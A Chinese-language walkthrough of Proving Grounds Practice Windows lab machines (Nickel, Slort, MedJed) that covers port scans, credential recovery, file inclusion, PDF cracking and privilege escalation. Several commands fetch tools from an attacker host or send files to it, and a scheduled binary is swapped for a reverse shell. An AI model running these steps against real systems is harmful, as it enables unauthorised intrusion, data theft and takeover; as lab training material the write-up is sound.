修改为靶机IP后访问提示要POST，POST发包得到内容

![image-20250311185931723](./PG_win.assets/image-20250311185931723.png)

得到执行的命令是：

```
cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh
```

拿到一个用户凭证：ariah/Tm93aXNlU2xvb3BUaGVvcnkxMzkK，之前nmap扫描结果显示开放了22端口

```
ssh ariah@192.168.133.99
```

使用Tm93aXNlU2xvb3BUaGVvcnkxMzkK凭证登录失败，放在cyberchef发现是base64加密过的，解密真实凭证为：NowiseSloopTheory139

使用解密后的密码成功登录ssh

![image-20250311190944077](./PG_win.assets/image-20250311190944077.png)

拿到local

![image-20250311191045205](./PG_win.assets/image-20250311191045205.png)

用该用户凭证RDP登录失败了，上传winPEASany.exe

```
certutil -split -urlcache -f http://192.168.45.161:90/winPEASany.exe C:\\Users\\ariah\\Desktop\\winPEASany.exe
```

没找到有用的信息

在根目录\ftp下找到一个pdf

![image-20250311204929956](./PG_win.assets/image-20250311204929956.png)

上传nc.exe

```
certutil -split -urlcache -f http://192.168.45.161:90/nc.exe C:\\ftp\\nc.exe
```

使用nc传输pdf下来（scp也可以

```
type Infrastructure.pdf | .\nc.exe 192.168.45.161 9001
```

![image-20250311205416993](./PG_win.assets/image-20250311205416993.png)

可以使用pdfcrack对加密pdf进行爆破

```
pdfcrack -w /root/rockyou.txt Infrastructure.pdf 
```

![image-20250311210659281](./PG_win.assets/image-20250311210659281.png)

拿到密码：ariah4168

![image-20250311210734733](./PG_win.assets/image-20250311210734733.png)

PDF给了一种执行命令的方式成功执行命令

```
curl http://nickel/?whoami
```

![image-20250311211024365](./PG_win.assets/image-20250311211024365.png)

直接使用`type`有空格，把特殊字符url编码一下，curl就能拿到proof

```
curl http://nickel/?type%20%5CUsers%5Cadministrator%5CDesktop%5Cproof.txt
```

![image-20250311211110634](./PG_win.assets/image-20250311211110634.png)



## Slort

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.133.53
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-12 12:26 CST
Nmap scan report for 192.168.133.53
Host is up (0.0028s latency).
Not shown: 65520 closed ports
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
| fingerprint-strings: 
|   DNSVersionBindReqTCP, HTTPOptions, LDAPBindReq, NULL, TLSSessionReq, TerminalServer, TerminalServerCookie, giop: 
|_    Host '192.168.251.133' is not allowed to connect to this MariaDB server
4443/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.133.53:4443/dashboard/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8080/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.133.53:8080/dashboard/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.80%I=7%D=3/12%Time=67D10CE9%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4E,"J\0\0\x01\xffj\x04Host\x20'192\.168\.251\.133'\x20is\x20not\x20a
SF:llowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(HTTPOpti
SF:ons,4E,"J\0\0\x01\xffj\x04Host\x20'192\.168\.251\.133'\x20is\x20not\x20
SF:allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(DNSVers
SF:ionBindReqTCP,4E,"J\0\0\x01\xffj\x04Host\x20'192\.168\.251\.133'\x20is\
SF:x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")
SF:%r(TerminalServerCookie,4E,"J\0\0\x01\xffj\x04Host\x20'192\.168\.251\.1
SF:33'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x
SF:20server")%r(TLSSessionReq,4E,"J\0\0\x01\xffj\x04Host\x20'192\.168\.251
SF:\.133'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaD
SF:B\x20server")%r(LDAPBindReq,4E,"J\0\0\x01\xffj\x04Host\x20'192\.168\.25
SF:1\.133'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20Maria
SF:DB\x20server")%r(TerminalServer,4E,"J\0\0\x01\xffj\x04Host\x20'192\.168
SF:\.251\.133'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20M
SF:ariaDB\x20server")%r(giop,4E,"J\0\0\x01\xffj\x04Host\x20'192\.168\.251\
SF:.133'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB
SF:\x20server");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=3/12%OT=21%CT=1%CU=42346%PV=Y%DS=4%DC=T%G=Y%TM=67D10DA
OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10D%TI=I%CI=I%TS=U)OPS(O1=M
OS:54ENW8NNS%O2=M54ENW8NNS%O3=M54ENW8%O4=M54ENW8NNS%O5=M54ENW8NNS%O6=M54ENN
OS:S)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%
OS:W=FFFF%O=M54ENW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=
OS:N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T
OS:7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE
OS:(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-12T04:29:06
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   2.79 ms 192.168.45.1
2   2.79 ms 192.168.45.254
3   2.88 ms 192.168.251.1
4   3.02 ms 192.168.133.53

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 199.89 seconds
```

4443和8080开放了http服务，都是XAMPP

![image-20250312124406641](./PG_win.assets/image-20250312124406641.png)

（开放的端口按照经验http服务应该是入口，但是dirsearch没扫出来有用的东西，看了下hints，入口在目录site下面，dirsearch真不行，还是得用gobuster

```
gobuster dir -u http://192.168.133.53:4443 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

gobuster是能扫到的

![image-20250312141107875](./PG_win.assets/image-20250312141107875.png)

访问会有明显的LFI漏洞痕迹（8080和4443端口服务是完全一样的

![image-20250312141359529](./PG_win.assets/image-20250312141359529.png)

成功读取win.ini文件

![image-20250312141438696](./PG_win.assets/image-20250312141438696.png)

题目没有开放ssh端口，可以暂时排除读取私钥，尝试远程文件包含成功执行命令

![image-20250312143249019](./PG_win.assets/image-20250312143249019.png)

反弹shell（拿到local没截图

![image-20250312184058322](./PG_win.assets/image-20250312184058322.png)

上传并运行winPEASany.exe，输出太多终端显示不了

![image-20250312184849456](./PG_win.assets/image-20250312184849456.png)

使用nc传输输出文件到攻击端`less -R file`按页查看，东西很多很多，同时在主机C盘根目录发现Backup文件夹

![image-20250312192123684](./PG_win.assets/image-20250312192123684.png)

在info.txt找到定时运行信息

![image-20250312192829125](./PG_win.assets/image-20250312192829125.png)

修改文件TFTP.EXE为反弹shell程序

```
iwr -uri http://192.168.45.161:90/reshell.exe -Outfile TFTP.EXE
```

监听攻击机80端口，拿到system权限shell，拿到proof

![image-20250312194245409](./PG_win.assets/image-20250312194245409.png)

## MedJed

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.133.127
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-12 19:44 CST
Warning: 192.168.133.127 giving up on port because retransmission cap hit (6).
Nmap scan report for 192.168.133.127
Host is up (0.0037s latency).
Not shown: 65518 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
| fingerprint-strings: 
|   NULL: 
|_    Host '192.168.45.161' is not allowed to connect to this MariaDB server
5040/tcp  open  unknown
8000/tcp  open  http-alt      BarracudaServer.com (Windows)
| fingerprint-strings: 
|   FourOhFourRequest, Socks5: 
|     HTTP/1.1 200 OK
|     Date: Wed, 12 Mar 2025 11:53:13 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   GenericLines, GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Wed, 12 Mar 2025 11:53:08 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Date: Wed, 12 Mar 2025 11:53:18 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   SIPOptions: 
|     HTTP/1.1 400 Bad Request
|     Date: Wed, 12 Mar 2025 11:54:21 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|     Content-Type: text/html
|     Cache-Control: no-store, no-cache, must-revalidate, max-age=0
|_    <html><body><h1>400 Bad Request</h1>Can't parse request<p>BarracudaServer.com (Windows)</p></body></html>
| http-methods: 
|_  Potentially risky methods: PROPFIND PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: BarracudaServer.com (Windows)
|_http-title: Home
| http-webdav-scan: 
|   Server Date: Wed, 12 Mar 2025 11:55:51 GMT
|   WebDAV type: Unknown
|   Server Type: BarracudaServer.com (Windows)
|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
30021/tcp open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -r--r--r-- 1 ftp ftp            536 Nov 03  2020 .gitignore
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 app
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 bin
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 config
| -r--r--r-- 1 ftp ftp            130 Nov 03  2020 config.ru
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 db
| -r--r--r-- 1 ftp ftp           1750 Nov 03  2020 Gemfile
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 lib
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 log
| -r--r--r-- 1 ftp ftp             66 Nov 03  2020 package.json
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 public
| -r--r--r-- 1 ftp ftp            227 Nov 03  2020 Rakefile
| -r--r--r-- 1 ftp ftp            374 Nov 03  2020 README.md
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 test
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 tmp
|_drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 vendor
|_ftp-bounce: bounce working!
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
33033/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 3102
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <title>Action Controller: Exception caught</title>
|     <style>
|     body {
|     background-color: #FAFAFA;
|     color: #333;
|     margin: 0px;
|     body, p, ol, ul, td {
|     font-family: helvetica, verdana, arial, sans-serif;
|     font-size: 13px;
|     line-height: 18px;
|     font-size: 11px;
|     white-space: pre-wrap;
|     pre.box {
|     border: 1px solid #EEE;
|     padding: 10px;
|     margin: 0px;
|     width: 958px;
|     header {
|     color: #F0F0F0;
|     background: #C52F24;
|     padding: 0.5em 1.5em;
|     margin: 0.2em 0;
|     line-height: 1.1em;
|     font-size: 2em;
|     color: #C52F24;
|     line-height: 25px;
|     .details {
|_    bord
44330/tcp open  ssl/unknown
|_ssl-date: 2025-03-12T11:56:20+00:00; 0s from scanner time.
45332/tcp open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
|_http-title: Quiz App
45443/tcp open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
|_http-title: Quiz App
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3306-TCP:V=7.80%I=7%D=3/12%Time=67D1759E%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.161'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8000-TCP:V=7.80%I=7%D=3/12%Time=67D175A4%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Wed,\x2012\x20Mar\x20
SF:2025\x2011:53:08\x20GMT\r\nServer:\x20BarracudaServer\.com\x20\(Windows
SF:\)\r\nConnection:\x20Close\r\n\r\n")%r(GetRequest,72,"HTTP/1\.1\x20200\
SF:x20OK\r\nDate:\x20Wed,\x2012\x20Mar\x202025\x2011:53:08\x20GMT\r\nServe
SF:r:\x20BarracudaServer\.com\x20\(Windows\)\r\nConnection:\x20Close\r\n\r
SF:\n")%r(FourOhFourRequest,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Wed,\x2
SF:012\x20Mar\x202025\x2011:53:13\x20GMT\r\nServer:\x20BarracudaServer\.co
SF:m\x20\(Windows\)\r\nConnection:\x20Close\r\n\r\n")%r(Socks5,72,"HTTP/1\
SF:.1\x20200\x20OK\r\nDate:\x20Wed,\x2012\x20Mar\x202025\x2011:53:13\x20GM
SF:T\r\nServer:\x20BarracudaServer\.com\x20\(Windows\)\r\nConnection:\x20C
SF:lose\r\n\r\n")%r(HTTPOptions,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Wed
SF:,\x2012\x20Mar\x202025\x2011:53:18\x20GMT\r\nServer:\x20BarracudaServer
SF:\.com\x20\(Windows\)\r\nConnection:\x20Close\r\n\r\n")%r(RTSPRequest,72
SF:,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Wed,\x2012\x20Mar\x202025\x2011:53
SF::18\x20GMT\r\nServer:\x20BarracudaServer\.com\x20\(Windows\)\r\nConnect
SF:ion:\x20Close\r\n\r\n")%r(SIPOptions,13C,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nDate:\x20Wed,\x2012\x20Mar\x202025\x2011:54:21\x20GMT\r\nServe
SF:r:\x20BarracudaServer\.com\x20\(Windows\)\r\nConnection:\x20Close\r\nCo
SF:ntent-Type:\x20text/html\r\nCache-Control:\x20no-store,\x20no-cache,\x2
SF:0must-revalidate,\x20max-age=0\r\n\r\n<html><body><h1>400\x20Bad\x20Req
SF:uest</h1>Can't\x20parse\x20request<p>BarracudaServer\.com\x20\(Windows\
SF:)</p></body></html>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port33033-TCP:V=7.80%I=7%D=3/12%Time=67D175A4%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(GetReque
SF:st,C76,"HTTP/1\.0\x20403\x20Forbidden\r\nContent-Type:\x20text/html;\x2
SF:0charset=UTF-8\r\nContent-Length:\x203102\r\n\r\n<!DOCTYPE\x20html>\n<h
SF:tml\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20charset=\"utf-8\"\x20/>\n
SF:\x20\x20<title>Action\x20Controller:\x20Exception\x20caught</title>\n\x
SF:20\x20<style>\n\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20backg
SF:round-color:\x20#FAFAFA;\n\x20\x20\x20\x20\x20\x20color:\x20#333;\n\x20
SF:\x20\x20\x20\x20\x20margin:\x200px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\
SF:x20body,\x20p,\x20ol,\x20ul,\x20td\x20{\n\x20\x20\x20\x20\x20\x20font-f
SF:amily:\x20helvetica,\x20verdana,\x20arial,\x20sans-serif;\n\x20\x20\x20
SF:\x20\x20\x20font-size:\x20\x20\x2013px;\n\x20\x20\x20\x20\x20\x20line-h
SF:eight:\x2018px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20pre\x20{\n\x20\x2
SF:0\x20\x20\x20\x20font-size:\x2011px;\n\x20\x20\x20\x20\x20\x20white-spa
SF:ce:\x20pre-wrap;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20pre\.box\x20{\n\
SF:x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#EEE;\n\x20\x20\x20\x
SF:20\x20\x20padding:\x2010px;\n\x20\x20\x20\x20\x20\x20margin:\x200px;\n\
SF:x20\x20\x20\x20\x20\x20width:\x20958px;\n\x20\x20\x20\x20}\n\n\x20\x20\
SF:x20\x20header\x20{\n\x20\x20\x20\x20\x20\x20color:\x20#F0F0F0;\n\x20\x2
SF:0\x20\x20\x20\x20background:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20paddi
SF:ng:\x200\.5em\x201\.5em;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h1\x20{\
SF:n\x20\x20\x20\x20\x20\x20margin:\x200\.2em\x200;\n\x20\x20\x20\x20\x20\
SF:x20line-height:\x201\.1em;\n\x20\x20\x20\x20\x20\x20font-size:\x202em;\
SF:n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h2\x20{\n\x20\x20\x20\x20\x20\x20
SF:color:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20line-height:\x2025px;\n\x20
SF:\x20\x20\x20}\n\n\x20\x20\x20\x20\.details\x20{\n\x20\x20\x20\x20\x20\x
SF:20bord")%r(HTTPOptions,C76,"HTTP/1\.0\x20403\x20Forbidden\r\nContent-Ty
SF:pe:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x203102\r\n\r\n<!
SF:DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20chars
SF:et=\"utf-8\"\x20/>\n\x20\x20<title>Action\x20Controller:\x20Exception\x
SF:20caught</title>\n\x20\x20<style>\n\x20\x20\x20\x20body\x20{\n\x20\x20\
SF:x20\x20\x20\x20background-color:\x20#FAFAFA;\n\x20\x20\x20\x20\x20\x20c
SF:olor:\x20#333;\n\x20\x20\x20\x20\x20\x20margin:\x200px;\n\x20\x20\x20\x
SF:20}\n\n\x20\x20\x20\x20body,\x20p,\x20ol,\x20ul,\x20td\x20{\n\x20\x20\x
SF:20\x20\x20\x20font-family:\x20helvetica,\x20verdana,\x20arial,\x20sans-
SF:serif;\n\x20\x20\x20\x20\x20\x20font-size:\x20\x20\x2013px;\n\x20\x20\x
SF:20\x20\x20\x20line-height:\x2018px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\
SF:x20pre\x20{\n\x20\x20\x20\x20\x20\x20font-size:\x2011px;\n\x20\x20\x20\
SF:x20\x20\x20white-space:\x20pre-wrap;\n\x20\x20\x20\x20}\n\n\x20\x20\x20
SF:\x20pre\.box\x20{\n\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#
SF:EEE;\n\x20\x20\x20\x20\x20\x20padding:\x2010px;\n\x20\x20\x20\x20\x20\x
SF:20margin:\x200px;\n\x20\x20\x20\x20\x20\x20width:\x20958px;\n\x20\x20\x
SF:20\x20}\n\n\x20\x20\x20\x20header\x20{\n\x20\x20\x20\x20\x20\x20color:\
SF:x20#F0F0F0;\n\x20\x20\x20\x20\x20\x20background:\x20#C52F24;\n\x20\x20\
SF:x20\x20\x20\x20padding:\x200\.5em\x201\.5em;\n\x20\x20\x20\x20}\n\n\x20
SF:\x20\x20\x20h1\x20{\n\x20\x20\x20\x20\x20\x20margin:\x200\.2em\x200;\n\
SF:x20\x20\x20\x20\x20\x20line-height:\x201\.1em;\n\x20\x20\x20\x20\x20\x2
SF:0font-size:\x202em;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h2\x20{\n\x20
SF:\x20\x20\x20\x20\x20color:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20line-he
SF:ight:\x2025px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\.details\x20{\n\x
SF:20\x20\x20\x20\x20\x20bord");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=3/12%OT=135%CT=1%CU=40656%PV=Y%DS=4%DC=T%G=Y%TM=67D176
OS:A0%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=10B%TI=I%CI=I%TS=U)OPS(O1=M
OS:54ENW8NNS%O2=M54ENW8NNS%O3=M54ENW8%O4=M54ENW8NNS%O5=M54ENW8NNS%O6=M54ENN
OS:S)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%
OS:W=FFFF%O=M54ENW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=
OS:N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T
OS:7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE
OS:(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-12T11:55:53
|_  start_date: N/A

TRACEROUTE (using port 53/tcp)
HOP RTT     ADDRESS
1   3.07 ms 192.168.45.1
2   3.06 ms 192.168.45.254
3   3.15 ms 192.168.251.1
4   3.35 ms 192.168.133.127

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 768.65 seconds
```

8000http端口开放BarracudaDrive 6.5服务（在右上角about页面能看到

![image-20250312201433660](./PG_win.assets/image-20250312201433660.png)

检索漏洞正好有一个版本对得上的：`Insecure Folder Permissions /不安全的文件夹权限`

![image-20250312201804548](./PG_win.assets/image-20250312201804548.png)

看了下exp内容，是关于后渗透提权（拿到shell之后的

目前阶段没太大用处，nmap还显示开放了ftp，连接查看

![image-20250312202022299](./PG_win.assets/image-20250312202022299.png)

全部下载到kali，使用grep看看有没有敏感信息

```
grep -rinE '(password|username|user|pass|key|token|secret|admin|login|credentials)'
```

没发现敏感信息，对其他开放的http端口看了下，左边的有登录点，右边的好像是玩猜答案游戏的

![image-20250312202659567](./PG_win.assets/image-20250312202659567.png)

尝试弱口令和注入都失败了，可能是根据人名介绍信息猜谜语的，先回到8000http端口的BarracudaDrive注册账号进去看，在后台点击老是弹窗提示用https，根据对nmap的扫描结果，该站点ssl在44330端口，功能点随便都点点

![image-20250312211504142](./PG_win.assets/image-20250312211504142.png)

点击上面按钮跳转到了类似文件管理器的页面，在url拼接路径可以访问

![image-20250312205934174](./PG_win.assets/image-20250312205934174.png)

其实这里是可以拿到local的，但是如果提权的话就需要拿到shell

![image-20250312212338731](./PG_win.assets/image-20250312212338731.png)

由于44330是https端口，不方便扫描，这里扫描8000端口（东西是一样的

```
gobuster dir -u http://192.168.133.127:8000 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

在8000端口的随便找一个文件(指纹)，这里找到一个sky.txt，在“文件管理器”：`/fs/C/bd/cmsdocs/`目录找到该文件，对比内容是完全一致的

![image-20250313133610923](./PG_win.assets/image-20250313133610923.png)

得到网站根目录，经过之前的翻找，该站点文件以.lsp结尾，在github搜索可以找到lsp re shell的相关工具：https://github.com/the-emmons/lsp-reverse-shell

![image-20250313180314318](./PG_win.assets/image-20250313180314318.png)

反弹shell直接是system权限，拿到proof

![image-20250313180453835](./PG_win.assets/image-20250313180453835.png)

`Proving Grounds Practice`靶场windows暂时到此结束，windows总体确实比较难，主要是nmap扫出来的东西太多了，不好确定入口，提权可能也很多

